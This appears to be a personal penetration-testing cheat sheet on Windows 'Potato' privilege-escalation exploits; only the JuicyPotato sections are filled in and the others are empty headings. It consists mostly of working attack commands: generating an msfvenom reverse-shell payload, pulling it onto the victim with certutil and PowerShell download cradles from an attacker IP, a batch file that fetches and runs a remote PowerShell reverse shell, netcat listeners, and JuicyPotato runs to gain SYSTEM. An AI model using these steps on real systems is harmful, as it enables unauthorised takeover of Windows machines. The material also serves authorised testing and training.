# Potato

## Table of Content

RottenPotato
JuicyPotato 
GhostPotato
SweetPotato
PrintSpoofer
RoguePotato 
GenericPotato
RemotePotato 
JuicyPotatoNG
CertPotato
LocalPotato


### JuicyPotato (PsExec)
```bash

This is an exploit before Windows 10 1809 and it actually worked in Windows 7 and 8 and 2008 R2. 

# Assume that you has a reverse shell with a user privilege. 

1. Run command and find "SeImpersonate" or "SeAssignPrimaryToken". 

    # @Windows 7 box (via reverse shell)
    Whoami /priv

2. Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows. 

    # @Kali 
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.155 LPORT=53 -f exe -o reverse.exe

    # @Kali
    sudo python3 -m http.server

    # @Windows 7 box (via reverse shell)
    >certutil -urlcache -split -f "http://192.168.142.155/reverse.exe" reverse.exe

    https://learn.microsoft.com/en-us/sysinternals/downloads/psexec 
    https://github.com/ohpe/juicy-potato/releases/tag/v0.1 
    https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts 

3. Use PSExec64.exe to trigger a reverse shell running as the Local Service service account 

    # @Windows 7 box (via reverse shell)
   >PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

    # @Windows 7 box (via reverse shell)
    whoami

4.Start another listener on Kali. 

    # @Kali 
    nv -nlvp 53

5. Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges. 

    # @Windows 7 box (via reverse shell)

   >JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}

    # Pick any CLSID you want. Here you can find the list organized by OS.
    # https://ohpe.it/juicy-potato/CLSID/ 

    # Or run a GetCLSID.ps1 script in the site below. 
    # https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

# Good reference
# https://ohpe.it/juicy-potato/ 

```

### JuicyPotato (Powershell)
```bash 
1. Download JuicyPotato.exe 

    # @Windows box (via reverse shell)
    PS>(new-object net.webclient).downloadfile('http://10.10.14.2/JuicyPotato.exe', 'C:\Users\Public\Downloads\jp.exe')

2. Prepare a PowerShell reverse shell 

    # @Kali 
    cp /opt/win/nishang/Shells/Invoke-PowerShellTcp.ps1 .
    mv Invoke-PowerShellTcp.ps1 shell.ps1

    # At the end of the powershell code, add the following: 
    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 1235

3. Create a shell.bat that contains the following code. 

    # @Kali 
    echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/shell.ps1')" > shell.bat 

4. Create a listener on port 1235

    # @Kali 
    nc -nlvp 1235 

5. Download the shell.bat

    # @Windows box (via reverse shell)
    PS>(new-object net.webclient).downloadfile('http://10.10.14.2/shell.bat', 'C:\Users\Public\Downloads\shell.bat')

6. Run the JuicyPotato Command

    # Windows 8 or 2008 R2
    PS>./jp.exe -t * -p shell.bat -l 4444
    # Windows 10 15063
    PS>./jp.exe -l 1337 -p shell.bat -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

### RoguePotato 

### PrintSpoofer

### LocalPotato







